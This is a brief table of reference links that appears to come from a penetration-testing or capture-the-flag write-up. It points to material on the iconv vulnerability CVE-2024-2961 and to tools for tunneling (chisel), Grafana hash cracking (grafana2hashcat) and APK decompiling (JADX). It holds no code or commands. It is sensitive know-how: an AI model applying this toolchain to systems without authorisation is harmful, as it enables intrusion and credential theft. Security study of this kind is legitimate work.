| https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html                                                                                    | ICONV CVE-2024-2961                |
| https://nvd.nist.gov/vuln/detail/cve-2024-2961                                                                                       | NIST CVE-2024-2961                 |
| https://github.com/ambionics/wrapwrap                                                                                                | wrapwrap                           |
| https://github.com/jpillora/chisel                                                                                                   | https://github.com/jpillora/chisel |

| https://github.com/iamaldi/grafana2hashcat                                                                                           | grafana2hashcat                    |
| https://github.com/skylot/jadx                                                                                                       | JADX                               |

